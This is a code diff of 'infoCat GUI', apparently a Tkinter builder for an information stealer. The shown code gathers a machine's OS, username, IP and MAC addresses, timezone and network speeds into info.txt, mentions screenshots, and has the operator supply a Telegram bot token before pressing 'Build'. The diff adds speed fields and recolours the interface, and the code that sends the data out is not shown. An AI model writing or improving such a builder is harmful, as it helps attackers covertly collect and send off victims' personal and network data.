@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 from tkinter import *
 from tkinter import messagebox as mb
 from PIL import ImageTk, Image
@@ -50,7 +51,7 @@ elif ost == "darwin":
 else:
     pass
 file = open("info.txt", "w")
-file.write(f'[================================================]\\n  Operating System: {ost}\\n  Username:   {name}\\n  IP adress:   {ip}\\n  MAC adress:  {mac}\\n  Timezone:  {time}\\n  Work speed:  {workspeed}\\n[================================================]')
+file.write(f'[================================================]\\n  Operating System: {ost}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time}\\n  Work speed: {workspeed}\\n  Download: {download} MB/s\\n  Upload: {uploads} MB/s\\n [================================================]')
 file.close()
 
 text = "Screenshot"
@@ -87,7 +88,7 @@ def clicked2():
 
 
 root = Tk()
-root.configure(background="#457f8a")
+root.configure(background="#000000")
 root.title("infoCat GUI")
 root.iconbitmap("icon.ico")
 root.geometry("300x400")
@@ -98,22 +99,22 @@ image = ImageTk.PhotoImage(img)
 initil = Label(root, image=image)
 initil.grid(padx=0, pady=0)
 
-text = Label(root, text="Telegram bot token", bg="#457f8a", fg="#ffffff")
+text = Label(root, text="Telegram bot token", bg="#000000", fg="#ffffff")
 text.grid(padx=0, pady=0)
 
-API = Entry(root, width=20, bg="#00d9ff")
+API = Entry(root, width=20, bg="#8c8c8c")
 API.grid(padx=0, pady=0)
 
-text2 = Label(root, text="Path to save the files", bg="#457f8a", fg="#ffffff")
+text2 = Label(root, text="Path to save the files", bg="#000000", fg="#ffffff")
 text2.grid(padx=0, pady=0)
 
-direct = Entry(root, width=20, bg="#00d9ff")
+direct = Entry(root, width=20, bg="#8c8c8c")
 direct.grid(padx=0, pady=0)
 
-button = Button(root, text="     Build     ", command=clicked, background="#30c9cf", height=2)
+button = Button(root, text="     Build     ", command=clicked, background="#ffea00", height=2)
 button.grid(padx=6, pady=6)
 
-help = Button(root, text="     Help     ", command=clicked2, background="#30c9cf", height=1)
+help = Button(root, text="     Help     ", command=clicked2, background="#ffea00", height=1)
 help.grid(padx=6, pady=8)
 
 root.mainloop()
